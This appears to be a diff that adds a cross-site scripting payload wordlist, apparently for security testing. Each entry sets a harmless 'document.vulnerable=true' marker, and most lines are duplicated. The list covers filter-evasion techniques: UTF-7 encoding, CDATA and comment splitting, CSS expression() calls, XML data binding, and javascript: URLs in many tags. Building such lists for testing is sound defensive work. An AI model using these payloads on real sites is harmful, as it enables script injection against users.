@@ -1,0 +1,83 @@
+
+230597810930;
+230597810930;
+[\xC0][\xBC]script>document.vulnerable=true;[\xC0][\xBC]/script>
+[\xC0][\xBC]script>document.vulnerable=true;[\xC0][\xBC]/script>
+<div datafld="b" dataformatas="html" datasrc="#X"></div>
+<div datafld="b" dataformatas="html" datasrc="#X"></div>
+<xml id="X"><a><b><script>document.vulnerable=true;</script>;</b></a></xml>
+<xml id="X"><a><b><script>document.vulnerable=true;</script>;</b></a></xml>
+<xml src="javascript:document.vulnerable=true;">
+<xml src="javascript:document.vulnerable=true;">
+<img src="blah>" onmouseover="document.vulnerable=true;">
+<img src="blah>" onmouseover="document.vulnerable=true;">
+<img src="blah"onmouseover="document.vulnerable=true;">
+<img src="blah"onmouseover="document.vulnerable=true;">
+<!-- -- --><script>document.vulnerable=true;</script><!-- -- -->
+<!-- -- --><script>document.vulnerable=true;</script><!-- -- -->
+<![CDATA[<!--]]<script>document.vulnerable=true;//--></script>
+<![CDATA[<!--]]<script>document.vulnerable=true;//--></script>
+<<script>document.vulnerable=true;</script>
+<<script>document.vulnerable=true;</script>
+<style><!--</style><script>document.vulnerable=true;//--></script>
+<style><!--</style><script>document.vulnerable=true;//--></script>
+<object classid="clsid:..." codebase="javascript:document.vulnerable=true;">
+<object classid="clsid:..." codebase="javascript:document.vulnerable=true;">
+<style type="text/javascript">document.vulnerable=true;</style>
+<style type="text/javascript">document.vulnerable=true;</style>
+<div style="width: expression(document.vulnerable=true;);">
+<div style="width: expression(document.vulnerable=true;);">
+<div style="binding: url([link to code]);">
+<div style="binding: url([link to code]);">
+<div style="behaviour: url([link to code]);">
+<div style="behaviour: url([link to code]);">
+<div style="background-image: url(javascript:document.vulnerable=true;);">
+<div style="background-image: url(javascript:document.vulnerable=true;);">
+<a href="about:<script>document.vulnerable=true;</script>">
+<a href="about:<script>document.vulnerable=true;</script>">
+<img src="livescript:document.vulnerable=true;">
+<img src="livescript:document.vulnerable=true;">
+<body onload="document.vulnerable=true;">
+<body onload="document.vulnerable=true;">
+<img src="mocha:document.vulnerable=true;">
+<img src="mocha:document.vulnerable=true;">
+<link rel="stylesheet" href="javascript:document.vulnerable=true;">
+<link rel="stylesheet" href="javascript:document.vulnerable=true;">
+<img src=
+<img src=&{document.vulnerable=true;};>
+
+&{document.vulnerable=true;};
+
+&<script>document.vulnerable=true;</script>
+<bgsound src="javascript:document.vulnerable=true;">
+<bgsound src="javascript:document.vulnerable=true;">
+<input type="image" dynsrc="javascript:document.vulnerable=true;">
+<input type="image" dynsrc="javascript:document.vulnerable=true;">
+<img dynsrc="javascript:document.vulnerable=true;">
+<img dynsrc="javascript:document.vulnerable=true;">
+<img src="javascript:document.vulnerable=true;">
+<img src="javascript:document.vulnerable=true;">
+<div onmouseover="document.vulnerable=true;">
+<div onmouseover="document.vulnerable=true;">
+<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD> ADw-SCRIPT AD4-document.vulnerable=true; ADw-/SCRIPT AD4-
+<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-document.vulnerable=true;+ADw-/SCRIPT+AD4-
+<a href="javascript#document.vulnerable=true;">
+<a href="javascript#document.vulnerable=true;">
+<? echo('<SCR)';echo('IPT>document.vulnerable=true</SCRIPT>'); ?>
+<? echo('<SCR)';echo('IPT>document.vulnerable=true</SCRIPT>'); ?>
+<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>document.vulnerable=true</SCRIPT>"></BODY></HTML>
+<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>document.vulnerable=true</SCRIPT>"></BODY></HTML>
+<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:document.vulnerable=true"></B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
+<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:document.vulnerable=true"></B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
+<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]<![CDATA[cript:document.vulnerable=true;">]]</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]<![CDATA[cript:document.vulnerable=true;">]]</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:document.vulnerable=true></OBJECT>
+<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:document.vulnerable=true></OBJECT>
+<BASE HREF="javascript:document.vulnerable=true;//">
+<BASE HREF="javascript:document.vulnerable=true;//">
+<!--[if gte IE 4]><SCRIPT>document.vulnerable=true;</SCRIPT><![endif]-->
+<!--[if gte IE 4]><SCRIPT>document.vulnerable=true;</SCRIPT><![endif]-->
+<STYLE type="text/css">BODY{background:url("javascript:document.vulnerable=true")}</STYLE>
+<STYLE type="text/css">BODY{background:url("javascript:document.vulnerable=true")}</STYLE>
+<STYLE>.XSS{background-image:url("javascript:document.vulnerable=true");}</STYLE><A CLASS=XSS></A>
+<STYLE>.XSS{background-image:url("javascript:document.vulnerable=true");}</STYLE><A CLASS=XSS></A>
